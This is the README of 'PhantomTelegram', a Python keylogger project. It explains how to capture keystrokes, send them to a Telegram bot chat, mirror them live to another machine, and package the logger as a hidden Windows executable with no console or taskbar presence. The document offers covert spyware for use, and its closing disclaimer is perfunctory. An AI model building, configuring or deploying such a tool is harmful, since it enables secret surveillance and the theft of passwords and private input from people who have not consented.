# PhantomTelegram

**PhantomTelegram** is a lightweight keylogger written in Python. It now supports two workflows:

- Sending buffered keystroke logs to a Telegram bot (original flow in `src/main.py`).
- Mirroring live keystrokes from one machine to another via Telegram bots, so no open TCP ports are required (`src/server.py` + `src/client.py`).

## Features
- Captures keystrokes with layout-aware translation on Windows.
- Sends the captured input to a Telegram chat in near real-time with rate limiting.
- Mirrors keystrokes from a background server to a client UI instantly over Telegram, with an option to toggle copying on the receiving side.

## Getting Started
1. **Clone the Repo:**
   ```bash
   git clone https://github.com/XeinTDM/PhantomTelegram.git
   cd PhantomTelegram
   ```
2. **Create and Activate a Virtual Environment (Recommended):**
   ```bash
   python -m venv .venv
   # Windows
   .venv\\Scripts\\activate
   # Linux/macOS
   source .venv/bin/activate
   ```
3. **Upgrade `pip` (avoids outdated-index errors on hosted environments):**
   ```bash
   python -m pip install --upgrade pip
   ```
4. **Install Dependencies:**
   ```bash
   pip install -r requirements.txt
   ```
   The project depends on `pynput` for keyboard hooks, `pyTelegramBotAPI` for the server logger, and `telethon` for the client listener.

### Telegram Bot Logger (existing flow)
1. **Set Your Config:**
   - Replace `BOT_TOKEN` with your Telegram bot token in `src/main.py`.
   - Replace `CHAT_ID` with your target chat ID in `src/main.py`.
2. **Run the Program:**
   ```bash
   python -m src.main
   ```

### Realtime Key Mirroring (Telegram transport)
To avoid firewall issues, the mirroring pair talks through Telegram:

**Server (captures and streams keys):**
- Set `SERVER_BOT_TOKEN` to your bot token and `TARGET_USER_ID` to your Telegram account ID (or chat).
- Start the headless streamer on the source machine:
  ```bash
  python -m src.server
  ```
- Every translated keystroke is sent as a JSON message to the target user; `/start` returns a short hint and `/stop` stops the streamer.

**Client (receives and replays keys):**
- Export your `TG_API_ID` and `TG_API_HASH` (from https://my.telegram.org) and optionally `SERVER_BOT_USERNAME` for convenience.
- Start the UI on the destination machine:
  ```bash
  python -m src.client
  ```
- Enter the server-bot username, click **Подключиться**, and watch incoming keystrokes appear with latency in milliseconds.
- Toggle **Копировать ввод** to decide whether received keys should be replayed locally through the keyboard controller.

## Building a Hidden Windows Executable

To bundle the Telegram logger into a background Windows executable that runs without a console window:

1. Install [PyInstaller](https://pyinstaller.org/en/stable/):
   ```bash
   pip install pyinstaller
   ```
2. Build the executable:
   ```bash
   pyinstaller --onefile --noconsole --name PhantomTelegram src/main.py
   ```
3. The generated `dist/PhantomTelegram.exe` starts without appearing on the taskbar or showing a console window.

To package the new tools, swap the entry point:
```bash
pyinstaller --onefile --noconsole --name KeyMirrorServer src/server.py
pyinstaller --onefile --name KeyMirrorClient src/client.py
```

## License
**PhantomTelegram** is licensed under [The Unlicense](LICENSE), so feel free to use, modify, and distribute it as you like.

## Troubleshooting

- **`No matching distribution found` during `pip install`:** Ensure you are using a modern Python (3.10+) and upgrade `pip` inside your virtual environment with `python -m pip install --upgrade pip`. Old system-managed pips (e.g., 9.x) cannot see modern package releases.
- **`alembic: command not found`:** The project does not use Alembic or any database migrations—skip that step entirely.

---

**Disclaimer:** This project is intended for educational and ethical purposes only. Unauthorized use, including but not limited to illegal activities, surveillance without consent, or any action that violates laws or personal privacy, is strictly prohibited. The author assumes no responsibility for misuse.
